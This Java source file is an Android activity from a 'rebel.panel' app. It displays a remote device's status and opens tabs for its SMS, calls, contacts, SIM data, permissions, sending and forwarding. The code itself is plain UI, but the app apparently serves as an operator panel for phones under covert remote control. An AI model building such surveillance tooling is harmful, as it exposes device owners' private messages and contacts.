package com.rebel.panel;

import android.os.Bundle;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.viewpager2.widget.ViewPager2;

import com.google.android.material.tabs.TabLayout;
import com.google.android.material.tabs.TabLayoutMediator;
import com.rebel.panel.ui.DevicePagerAdapter;

public class DeviceDetailActivity extends AppCompatActivity {

    public static final String EXTRA_DEVICE_ID = "device_id";
    public static final String EXTRA_DEVICE_NAME = "device_name";
    public static final String EXTRA_DEVICE_ONLINE = "device_online";
    public static final String EXTRA_DEVICE_BATTERY = "device_battery";
    public static final String EXTRA_DEVICE_NETWORK = "device_network";
    public static final String EXTRA_DEVICE_ANDROID = "device_android";
    public static final String EXTRA_DEVICE_SMS_COUNT = "device_sms_count";
    public static final String EXTRA_DEVICE_CHARGING = "device_charging";
    public static final String EXTRA_DEVICE_LAST_SEEN = "device_last_seen";

    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_device_detail);

        deviceId = getIntent().getStringExtra(EXTRA_DEVICE_ID);
        boolean online = getIntent().getBooleanExtra(EXTRA_DEVICE_ONLINE, false);
        int battery = getIntent().getIntExtra(EXTRA_DEVICE_BATTERY, 0);
        boolean charging = getIntent().getBooleanExtra(EXTRA_DEVICE_CHARGING, false);
        String network = getIntent().getStringExtra(EXTRA_DEVICE_NETWORK);
        String androidVer = getIntent().getStringExtra(EXTRA_DEVICE_ANDROID);
        int smsCount = getIntent().getIntExtra(EXTRA_DEVICE_SMS_COUNT, 0);
        long lastSeen = getIntent().getLongExtra(EXTRA_DEVICE_LAST_SEEN, 0);

        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
            getSupportActionBar().setTitle(getIntent().getStringExtra(EXTRA_DEVICE_NAME));
        }
        toolbar.setNavigationOnClickListener(v -> finish());

        TextView badge = findViewById(R.id.hero_badge);
        TextView heroMeta = findViewById(R.id.hero_meta);
        badge.setText(online ? "● ONLINE" : "○ OFFLINE");
        badge.setTextColor(online ? 0xFF00FF9D : 0xFF6B6B88);

        String lastSeenText = online ? "● ACTIVE" : formatAgo(lastSeen);
        heroMeta.setText(String.format("Battery %d%%%s  •  %s  •  Android %s  •  %d SMS  •  %s",
            battery, charging ? " ⚡" : "", network, androidVer, smsCount, lastSeenText));

        ViewPager2 pager = findViewById(R.id.device_pager);
        TabLayout tabs = findViewById(R.id.device_tabs);
        DevicePagerAdapter adapter = new DevicePagerAdapter(this, deviceId);
        pager.setAdapter(adapter);

        new TabLayoutMediator(tabs, pager, (tab, position) -> {
            switch (position) {
                case 0: tab.setText("SMS"); break;
                case 1: tab.setText("Calls"); break;
                case 2: tab.setText("Contacts"); break;
                case 3: tab.setText("SIM"); break;
                case 4: tab.setText("Perms"); break;
                case 5: tab.setText("Send"); break;
                default: tab.setText("Forward"); break;
            }
        }).attach();
    }

    private String formatAgo(long ts) {
        if (ts <= 0) return "—";
        long diff = System.currentTimeMillis() - ts;
        if (diff < 60_000) return (diff / 1000) + "s ago";
        if (diff < 3_600_000) return (diff / 60_000) + "m ago";
        return (diff / 3_600_000) + "h ago";
    }
}
